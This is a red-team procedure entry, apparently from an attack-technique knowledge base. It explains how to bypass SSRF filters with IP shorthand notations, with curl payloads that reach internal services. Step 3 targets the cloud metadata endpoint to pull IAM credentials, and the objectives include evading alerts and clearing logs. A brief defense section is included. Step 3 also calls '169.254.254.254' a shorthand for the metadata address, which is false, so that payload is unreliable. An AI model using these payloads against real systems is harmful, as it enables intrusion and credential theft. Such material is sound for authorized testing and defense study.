---
id: a6eec382-5ac1-445c-96b6-28b448039a58
name: Server-Side-Request-Forgery-using-IP-Address-Shorthand
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:37.466621+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Bypassing filters]]'
  - '[[tags/Bypass using rare address]]'
  - '[[tags/Server-Side Request Forgery]]'
  - ssrf
  - bypass
  - web
commands:
  - '[[commands/curl-ssrf-ip-shorthand-test]]'
platforms:
  - Web
tools: []
validated: true
---

# Server-Side-Request-Forgery-using-IP-Address-Shorthand

## Summary

This procedure demonstrates how to exploit Server-Side Request Forgery (SSRF) vulnerabilities by using IP address shorthand notations to bypass input filters that block standard localhost or internal IP representations. By crafting requests with shorthand forms like '127.1' for '127.0.0.1' or '0/' for localhost, attackers can trick the application into making unauthorized requests to internal resources, enabling access to metadata services, internal APIs, or other restricted endpoints.

## Description

Server-Side Request Forgery (SSRF) occurs when a web application fetches remote resources based on user-supplied input without proper validation, allowing attackers to force the server to connect to arbitrary destinations. Filters often block obvious internal addresses like '127.0.0.1' or 'localhost', but shorthand notations—such as dropping leading zeros in octets (e.g., '127.1' for '127.0.0.1') or using decimal/ hexadecimal equivalents—can evade these checks. This technique is particularly effective against cloud environments where internal metadata endpoints (e.g., AWS IMDS at 169.254.169.254) are targeted. The procedure assumes a vulnerable URL parameter that accepts user-controlled URLs for server-side fetches, such as image imports or webhooks. Success allows lateral movement to internal networks, data exfiltration, or remote code execution if combined with other flaws.

## Requirements

1. Valid user session or access to the vulnerable web application endpoint that processes user-supplied URLs.
2. Knowledge of target internal IP addresses or services (e.g., localhost:8080 for internal apps, 169.254.169.254 for cloud metadata).
3. Tools for sending HTTP requests, such as curl or a proxy like Burp Suite.
4. Basic understanding of the application's URL parameter (e.g., ?url= or ?redirect=).

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation and whitelisting to allow only external, trusted domains; use libraries like Python's urlparse to normalize and check IPs.
- Disable or restrict access to internal services from the web server, such as firewall rules blocking outbound connections to private IPs (RFC 1918 ranges).
- Deploy a Web Application Firewall (WAF) configured to detect anomalous URL patterns, including IP shorthands and encoded representations.
- Enable application logging for all outbound requests and monitor for connections to internal endpoints; use tools like AWS GuardDuty or Azure Security Center for cloud-specific SSRF detection.

## Objectives

1. Bypass SSRF input filters using IP address shorthand to reach blocked internal destinations.
2. Retrieve sensitive data from internal services, such as configuration files or metadata.
3. Establish a foundation for further exploitation, like port scanning internals or chaining to RCE.
4. Validate the vulnerability without triggering alerts on standard blocked patterns.

## Instructions

### Step 1: Identify the Vulnerable Endpoint

**Context**: Locate the application feature that accepts and processes user-controlled URLs, such as file imports, webhooks, or avatar uploads. Test for basic SSRF by attempting to fetch an external controlled resource and checking if the server makes the request (e.g., via a redirect or response inclusion).

**Command** ([[commands/curl-ssrf-ip-shorthand-test]]):
```bash
curl -X POST "http://target.com/vulnerable-endpoint" -d "url=http://your-controlled-server.com/test" -v
```

> This step sends a request to the endpoint with a benign external URL. Monitor your controlled server for incoming connections from the target to confirm SSRF. If successful, the target server will fetch the URL on your behalf. Expected output includes verbose logs showing the POST and any response indicating processing.

### Step 2: Craft and Test IP Shorthand Payloads

**Context**: Once SSRF is confirmed, replace the URL with internal targets using shorthand notations to bypass filters. Common shorthands include: '0/' or '0.0.0.0' for localhost, '127.1' for '127.0.0.1', '127.0.1' for '127.0.0.1', or octal/hex forms like '0177.0.0.1'. Start with localhost to test access to local services.

**Command** ([[commands/curl-ssrf-ip-shorthand-test]]):
```bash
curl -X POST "http://target.com/vulnerable-endpoint" -d "url=http://127.1:8080/internal" -v
```

> Substitute '8080/internal' with the actual internal port/path (e.g., /admin or /metadata). Run variations like 'http://0/' or 'http://127.0.1'. Expected output: If bypassed, the response may include internal content or errors revealing service details; check server logs or response body for leaked data. If blocked, try encoding (e.g., URL-encoded or hex).

### Step 3: Escalate to Sensitive Internal Access

**Context**: If shorthand works, target high-value internals like cloud metadata (e.g., 'http://169.254.169.254/latest/meta-data/' for AWS). Iterate on shorthands if initial attempts fail, and combine with path traversal if needed (e.g., '../../../internal'). Verify success by exfiltrating data back through the response.

**Command** ([[commands/curl-ssrf-ip-shorthand-test]]):
```bash
curl -X POST "http://target.com/vulnerable-endpoint" -d "url=http://169.254.254.254/latest/meta-data/iam/security-credentials/" -v
```

> Use shorthand like '169.254.254.254' (dropping octet zeros). Expected output: Response containing IAM role credentials or metadata if successful. Monitor for temporary credentials that can be used for further pivoting.

### Step 4: Verify and Document Bypass

**Context**: Confirm the filter evasion by testing blocked vs. shorthand forms side-by-side. Document working payloads for chaining in attack scenarios, and clean up any artifacts (e.g., logs) if in a controlled test.

> No specific command needed here; compare responses from Steps 2-3. Success is indicated by access to internals via shorthand but rejection of standard IPs.
